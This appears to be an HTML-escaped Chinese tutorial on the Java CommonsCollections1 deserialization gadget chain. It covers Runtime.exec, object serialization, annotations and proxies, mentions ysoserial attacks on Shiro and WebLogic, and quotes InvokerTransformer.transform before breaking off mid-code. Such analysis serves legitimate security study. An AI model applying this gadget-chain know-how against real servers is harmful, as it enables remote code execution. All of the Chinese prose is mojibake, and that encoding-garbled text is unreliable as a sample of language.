&lt;p&gt;Runtimeç±»å°è£…äº†è¿è¡Œæ—¶çš„ç¯å¢ƒï¼Œæ¯ä¸ª Java åº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ª Runtime ç±»å®ä¾‹ï¼Œä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä¸å…¶è¿è¡Œçš„ç¯å¢ƒç›¸è¿æ¥ã€‚ä¸€æ—¦å¾—åˆ°äº†ä¸€ä¸ªå½“å‰çš„Runtimeå¯¹è±¡çš„å¼•ç”¨ï¼Œå°±å¯ä»¥è°ƒç”¨Runtimeå¯¹è±¡çš„æ–¹æ³•å»æ§åˆ¶Javaè™šæ‹Ÿæœºçš„çŠ¶æ€å’Œè¡Œä¸ºã€‚&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸èƒ½å®ä¾‹åŒ–ä¸€ä¸ªRuntimeå¯¹è±¡ï¼Œåº”ç”¨ç¨‹åºä¹Ÿä¸èƒ½åˆ›å»ºè‡ªå·±çš„ Runtime ç±»å®ä¾‹ï¼Œä½†å¯ä»¥é€šè¿‡ getRuntime() æ–¹æ³•è·å–å½“å‰Runtimeè¿è¡Œæ—¶å¯¹è±¡çš„å¼•ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;Runtimeç±»æä¾›äº†å¾ˆå¤šæœ‰ä»·å€¼çš„APIï¼Œæ–‡ä¸­ç”¨åˆ°çš„ä¸»è¦å°±æ˜¯exec(String command) ï¼ˆå³åœ¨å•ç‹¬çš„è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„å­—ç¬¦ä¸²å‘½ä»¤ï¼‰ã€‚&lt;/p&gt;
&lt;h3 id=&#34;java-ååºåˆ—åŒ–&#34;&gt;Java ååºåˆ—åŒ–&lt;/h3&gt;
&lt;p&gt;åºåˆ—åŒ–å°±æ˜¯æŠŠå¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµï¼Œä¾¿äºä¼ è¾“å’Œä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­ï¼›ååºåˆ—åŒ–æ˜¯åºåˆ—åŒ–çš„é€†è¿‡ç¨‹ï¼Œå³å°†æœ‰ç»“æ„çš„å­—èŠ‚æµè¿˜åŸæˆå¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://p4.ssl.qhimg.com/t01498bc259257de9d1.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;åœ¨Javaä¸­ï¼Œjava.io.ObjectOutputStreamä»£è¡¨å¯¹è±¡è¾“å‡ºæµï¼Œå®ƒçš„writeObject(Object obj)æ–¹æ³•å¯å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå¾—åˆ°çš„å­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä¸ä¹‹å¯¹åº”ï¼Œjava.io.ObjectInputStreamä»£è¡¨å¯¹è±¡è¾“å…¥æµï¼Œå®ƒçš„readObject()æ–¹æ³•ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹è±¡åºåˆ—åŒ–åŒ…æ‹¬å¦‚ä¸‹æ­¥éª¤ï¼š&lt;/p&gt;
&lt;p&gt;1ï¼‰ åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„ç›®æ ‡è¾“å‡ºæµï¼Œå¦‚æ–‡ä»¶è¾“å‡ºæµï¼›&lt;/p&gt;
&lt;p&gt;2ï¼‰ é€šè¿‡å¯¹è±¡è¾“å‡ºæµçš„writeObject()æ–¹æ³•å†™å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹è±¡ååºåˆ—åŒ–çš„æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1ï¼‰ åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å…¥æµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„æºè¾“å…¥æµï¼Œå¦‚æ–‡ä»¶è¾“å…¥æµï¼›&lt;/p&gt;
&lt;p&gt;2ï¼‰ é€šè¿‡å¯¹è±¡è¾“å…¥æµçš„readObject()æ–¹æ³•è¯»å–å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;åªæœ‰å®ç°äº†Serializableå’ŒExternalizableæ¥å£çš„ç±»ä¸”æ‰€æœ‰å±æ€§(ç”¨transientå…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹)éƒ½æ˜¯å¯åºåˆ—åŒ–çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚åœ¨åºåˆ—åŒ–ï¼ˆååºåˆ—åŒ–ï¼‰çš„æ—¶å€™ï¼ŒObjectOutputStreamï¼ˆObjectInputStreamï¼‰ä¼šå¯»æ‰¾ç›®æ ‡ç±»ä¸­çš„é‡å†™çš„writeObjectï¼ˆreadObjectï¼‰æ–¹æ³•ï¼Œèµ‹å€¼ç»™å˜é‡writeObjectMethodï¼ˆreadObjectMethodï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://p3.ssl.qhimg.com/t019c4322062818569d.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;java-æ³¨è§£&#34;&gt;Java æ³¨è§£&lt;/h3&gt;
&lt;p&gt;Java æ³¨è§£ï¼ˆAnnotationï¼‰åˆç§° Java æ ‡æ³¨ï¼Œæ˜¯ JDK5.0 å¼•å…¥çš„ä¸€ç§æ³¨é‡Šæœºåˆ¶ã€‚Java è¯­è¨€ä¸­çš„ç±»ã€æ–¹æ³•ã€å˜é‡ã€å‚æ•°å’ŒåŒ…ç­‰éƒ½å¯ä»¥è¢«æ ‡æ³¨ã€‚å’Œ Javadoc ä¸åŒï¼ŒJava æ ‡æ³¨å¯ä»¥é€šè¿‡åå°„è·å–æ ‡æ³¨å†…å®¹ã€‚åœ¨ç¼–è¯‘å™¨ç”Ÿæˆç±»æ–‡ä»¶æ—¶ï¼Œæ ‡æ³¨å¯ä»¥è¢«åµŒå…¥åˆ°å­—èŠ‚ç ä¸­ã€‚Java è™šæ‹Ÿæœºå¯ä»¥ä¿ç•™æ ‡æ³¨å†…å®¹ï¼Œåœ¨è¿è¡Œæ—¶å¯ä»¥è·å–åˆ°æ ‡æ³¨å†…å®¹ï¼Œä¹Ÿæ”¯æŒè‡ªå®šä¹‰ Java æ ‡æ³¨ã€‚&lt;/p&gt;
&lt;p&gt;Java å®šä¹‰äº†ä¸€å¥—æ³¨è§£ï¼ŒJava7ä¹‹å‰æœ‰ 7 ä¸ªï¼Œ3ä¸ªåœ¨java.langä¸­ï¼Œ4ä¸ªåœ¨ java.lang.annotation ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä½œç”¨äºä»£ç çš„æ³¨è§£æ˜¯å¦‚ä¸‹3ä¸ªï¼Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Override&#34;&gt;@Override&lt;/a&gt; â€“ æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦æ˜¯é‡å†™æ–¹æ³•ã€‚å¦‚æœå‘ç°å…¶çˆ¶ç±»ï¼Œæˆ–è€…æ˜¯å¼•ç”¨çš„æ¥å£ä¸­å¹¶æ²¡æœ‰è¯¥æ–¹æ³•æ—¶ï¼Œä¼šæŠ¥ç¼–è¯‘é”™è¯¯ï¼›&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Deprecated&#34;&gt;@Deprecated&lt;/a&gt; â€“ æ ‡è®°è¿‡æ—¶æ–¹æ³•ã€‚å¦‚æœä½¿ç”¨è¯¥æ–¹æ³•ï¼Œä¼šæŠ¥ç¼–è¯‘è­¦å‘Šï¼›&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SuppressWarnings&#34;&gt;@SuppressWarnings&lt;/a&gt; â€“ æŒ‡ç¤ºç¼–è¯‘å™¨å»å¿½ç•¥æ³¨è§£ä¸­å£°æ˜çš„è­¦å‘Šã€‚&lt;/p&gt;
&lt;p&gt;ä½œç”¨äºå…¶ä»–æ³¨è§£çš„æ³¨è§£(åˆç§°å…ƒæ³¨è§£)æ˜¯å¦‚ä¸‹4ä¸ªï¼Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Retention&#34;&gt;@Retention&lt;/a&gt; â€“ æ ‡è¯†è¿™ä¸ªæ³¨è§£æ€ä¹ˆä¿å­˜ï¼Œæ˜¯åªåœ¨ä»£ç ä¸­ï¼Œè¿˜æ˜¯ç¼–å…¥classæ–‡ä»¶ä¸­ï¼Œæˆ–è€…æ˜¯åœ¨è¿è¡Œæ—¶å¯ä»¥é€šè¿‡åå°„è®¿é—®ï¼›&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Documented&#34;&gt;@Documented&lt;/a&gt; â€“ æ ‡è®°è¿™äº›æ³¨è§£æ˜¯å¦åŒ…å«åœ¨ç”¨æˆ·æ–‡æ¡£ä¸­ï¼›&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Target&#34;&gt;@Target&lt;/a&gt; â€“ æ ‡è®°è¿™ä¸ªæ³¨è§£åº”è¯¥æ˜¯å“ªç§ Java æˆå‘˜ï¼Œå³æŒ‡å®š Annotation çš„ç±»å‹å±æ€§ï¼›&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/Inherited&#34;&gt;@Inherited&lt;/a&gt; â€“ æ ‡è®°è¿™ä¸ªæ³¨è§£æ˜¯ç»§æ‰¿äºå“ªä¸ªæ³¨è§£ç±»(é»˜è®¤ æ³¨è§£å¹¶æ²¡æœ‰ç»§æ‰¿äºä»»ä½•å­ç±»)ã€‚&lt;/p&gt;
&lt;h3 id=&#34;java-ä»£ç†&#34;&gt;Java ä»£ç†&lt;/h3&gt;
&lt;p&gt;ä»£ç†æ¨¡å¼æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œæä¾›äº†å¯¹ç›®æ ‡å¯¹è±¡é¢å¤–çš„è®¿é—®æ–¹å¼ï¼Œå³è®¾ç½®ä¸€ä¸ªä¸­é—´ä»£ç†ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡è®¿é—®ç›®æ ‡å¯¹è±¡ï¼Œæä¾›äº†å¯¹ç›®æ ‡å¯¹è±¡é¢å¤–çš„è®¿é—®æ–¹å¼ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸ä¿®æ”¹åŸç›®æ ‡å¯¹è±¡çš„å‰æä¸‹ï¼Œæä¾›é¢å¤–çš„åŠŸèƒ½æ“ä½œï¼Œæ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ï¼Œä»¥è¾¾åˆ°å¢å¼ºåŸå¯¹è±¡çš„åŠŸèƒ½å’Œç®€åŒ–è®¿é—®æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01462d72f25f6f5456.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Javaæä¾›äº†ä¸‰ç§ä»£ç†æ¨¡å¼ï¼šé™æ€ä»£ç†ã€åŠ¨æ€ä»£ç†å’Œcglibä»£ç†ã€‚
é™æ€ä»£ç†æ–¹å¼éœ€è¦ä»£ç†å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡å®ç°ä¸€æ ·çš„æ¥å£ã€‚
ä¼˜ç‚¹ï¼šå¯ä»¥åœ¨ä¸ä¿®æ”¹ç›®æ ‡å¯¹è±¡çš„å‰æä¸‹æ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ï¼›
ç¼ºç‚¹ï¼šâ‘ å†—ä½™ç”±äºä»£ç†å¯¹è±¡è¦å®ç°ä¸ç›®æ ‡å¯¹è±¡ä¸€è‡´çš„æ¥å£ï¼Œä¼šäº§ç”Ÿè¿‡å¤šçš„ä»£ç†ç±»ã€‚â‘¡ä¸æ˜“ç»´æŠ¤ã€‚ä¸€æ—¦æ¥å£å¢åŠ æ–¹æ³•ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†å¯¹è±¡éƒ½è¦è¿›è¡Œä¿®æ”¹ã€‚
åŠ¨æ€ä»£ç†åˆ©ç”¨äº†JDK APIï¼ŒåŠ¨æ€åœ°åœ¨å†…å­˜ä¸­æ„å»ºä»£ç†å¯¹è±¡ï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡å¯¹è±¡çš„ä»£ç†åŠŸèƒ½ã€‚åŠ¨æ€ä»£ç†åˆè¢«ç§°ä¸ºJDKä»£ç†æˆ–æ¥å£ä»£ç†ã€‚
é™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†çš„åŒºåˆ«ä¸»è¦åœ¨äºé™æ€ä»£ç†åœ¨ç¼–è¯‘æ—¶å°±å·²ç»å®ç°ï¼Œç¼–è¯‘å®Œæˆåä»£ç†ç±»æ˜¯ä¸€ä¸ªå®é™…çš„classæ–‡ä»¶ï¼Œè€ŒåŠ¨æ€ä»£ç†æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ï¼Œå³ç¼–è¯‘å®Œæˆåæ²¡æœ‰å®é™…çš„classæ–‡ä»¶ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆç±»å­—èŠ‚ç ï¼Œå¹¶åŠ è½½åˆ°JVMä¸­ã€‚
ç‰¹ç‚¹ï¼šåŠ¨æ€ä»£ç†å¯¹è±¡ä¸éœ€è¦å®ç°æ¥å£ï¼Œä½†æ˜¯è¦æ±‚ç›®æ ‡å¯¹è±¡å¿…é¡»å®ç°æ¥å£ï¼Œå¦åˆ™ä¸èƒ½ä½¿ç”¨åŠ¨æ€ä»£ç†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ç–‘é—®è§£ç­”ç‚¹&#34;&gt;ç–‘é—®è§£ç­”ç‚¹&lt;/h3&gt;
&lt;p&gt;ä½•ä¸ºé“¾ï¼Ÿä¸“ä¸šæœ¯è¯­ä¹Ÿç§°ä¸ºGadget chainï¼Œåœ¨Javaå½“ä¸­å«åšè°ƒç”¨é“¾ï¼Œä»å…¥å£ç±»é‡å†™çš„readObjectæ–¹æ³•ç»è¿‡ä¸€å±‚ä¸€å±‚ç±»å’Œæ–¹æ³•ï¼Œæœ€ç»ˆåˆ°è¾¾è§¦å‘æˆ‘ä»¬æ¶æ„ä»£ç çš„é“¾è·¯ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ä¼šè®²åˆ°&lt;code&gt;TransformedMap&lt;/code&gt;å’Œ&lt;code&gt;LazyMap&lt;/code&gt;è¿™ä¸¤ä¸ªè°ƒç”¨é“¾ï¼Œéƒ½æ¥è‡ªäºCommon-Collectionsåº“ï¼Œå¹¶ç»§æ‰¿AbstractMapDecoratorã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ysoserialå·¥å…·ä¸­CommonsCollections1é“¾æ˜¯ä½¿ç”¨&lt;code&gt;LazyMap&lt;/code&gt;ç±»ï¼Œå¹¶ä¸æ˜¯&lt;code&gt;TransformedMap&lt;/code&gt;ç±»ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨æ­¤ä¹‹å‰åˆå­¦è€…ä¼šæœ‰å¾ˆå¤šçš„ç–‘é—®ï¼Œæ¯”å¦‚ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å­¦CC1é“¾ä¸ºä»€ä¹ˆè¦ç”¨åˆ°TransformedMapç±»ï¼Ÿ&lt;/li&gt;
&lt;li&gt;ChainedTransformerå’ŒConstantTransformerçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ&lt;/li&gt;
&lt;li&gt;ä¸ºä»€ä¹ˆåˆè¦ç”¨åˆ°AnnotationInvocationHandlerè¿™ä¸ªç±»å‘¢ï¼Ÿ&lt;/li&gt;
&lt;li&gt;å¹³å¸¸æˆ‘ä»¬æ‰€è¯´ç”¨ysoserialç”Ÿæˆçš„CCé“¾éƒ½æ˜¯æ€ä¹ˆåˆ©ç”¨åˆ°shiroå’Œweblogicçš„å‘¢ï¼Ÿ&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æˆ‘ä»¬è¦å…ˆäº†è§£æ•´ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸‹é¢çš„è¿‡ç¨‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/commonscollections1_chain_analysis/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€ç¬¬äºŒç‚¹ç–‘é—®å¯ä»¥å…ˆå‚è€ƒè¿‡ç¨‹å›¾ç²—ç•¥äº†è§£ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆè¦ç”¨AnnotationInvocationHandlerç±»ï¼Œå› ä¸ºå®ƒé‡å†™äº†readObjectå‡½æ•°ï¼Œæ³¨æ„ï¼ŒAnnotationInvocationHandleræ˜¯ä¸å±äºCommonsCollectionsåº“é‡Œé¢çš„ï¼Œæ˜¯JDKåŸæœ‰çš„åº“ï¼Œè€Œä¸”ä¸ºä»€ä¹ˆè¦8u65çš„ç‰ˆæœ¬è¿›è¡Œæµ‹è¯•ï¼Œå› ä¸ºåœ¨8u71ä»¥åå¤§æ¦‚æ˜¯2015å¹´12æœˆçš„æ—¶å€™ï¼ŒJava å®˜æ–¹ä¿®æ”¹äº† sun.reflect.annotation.AnnotationInvocationHandler çš„readObjectå‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;å¹³æ—¶shiroå’Œweblogicç­‰åº”ç”¨çš„ååºåˆ—åŒ–æ¼æ´éƒ½æ˜¯åˆ©ç”¨ccé“¾è¿›è¡Œæ”»å‡»çš„ï¼Œæ•´ä¸ªè¿‡ç¨‹åˆæ˜¯æ€ä¹ˆæ ·å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥çŸ¥é“ååºåˆ—åŒ–æœ€ä¸»è¦çš„æ˜¯readObjectå‡½æ•°ï¼ŒreadObjectä¸»è¦æ˜¯å¯¹å­—èŠ‚ç è½¬æˆå¯¹è±¡ï¼Œç„¶è€Œæˆ‘ä»¬è¦æ”»å‡»å°±è¦æŠŠæ•´ä¸ª&lt;code&gt;å¯åºåˆ—åŒ–&lt;/code&gt;çš„payloadè¿›è¡Œåºåˆ—åŒ–ï¼Œè½¬æˆreadObjectè¦ä½¿ç”¨çš„å­—èŠ‚ç ã€‚æ‰€ä»¥åœ¨shiroå’Œweblogicç­‰ä¸€äº›åº”ç”¨åªè¦æœ‰å¯ä»¥æ¥å—å¤–ç•Œçš„æ•°æ®ï¼Œå¹¶ä¸”è¿™äº›æ•°æ®è¿˜ç»è¿‡äº†readObjectå°±èƒ½åˆ©ç”¨ccé“¾è¿›è¡Œæ”»å‡»ã€‚&lt;/p&gt;
&lt;h2 id=&#34;0x02-transformedmapé“¾åˆ†æ&#34;&gt;0x02 TransformedMapé“¾åˆ†æ&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬ä»ä¸Šé¢å·²ç»äº†è§£è¿‡äº†ï¼ŒCommonsCollectionsåº“æ˜¯åº”ç”¨å¸¸ç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨è¿™ä¸ªåº“é‡Œé¢æ‰¾åˆ°ä¸€äº›æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„å‡½æ•°å’Œç±»ã€‚å½“ä¸­InvokerTransformerï¼ˆæ€ä¹ˆæ‰¾çš„ï¼Ÿåˆ«é—®ï¼Œé—®å°±æ˜¯å¤§ä½¬å·²ç»æ‰¾å¥½äº†ğŸ¶ï¼‰è¿™ä¸ªç±»å°±å­˜åœ¨å±é™©å¯æ“ä½œçš„åœ°æ–¹ï¼Œæ¯”å¦‚é‡Œé¢çš„transformæ–¹æ³•ï¼Œè€Œä¸”ä¹Ÿç»§æ‰¿äº†Serializableæ¥å£ï¼Œç¬¦åˆæˆ‘ä»¬ååºåˆ—åŒ–çš„æ¡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢ç”¨åˆ°äº†åå°„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;transform&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cls&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cls&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iParamTypes&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iArgs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NoSuchMethodException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FunctorException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39; does not exist&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IllegalAccessException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FunctorException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iMethodName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
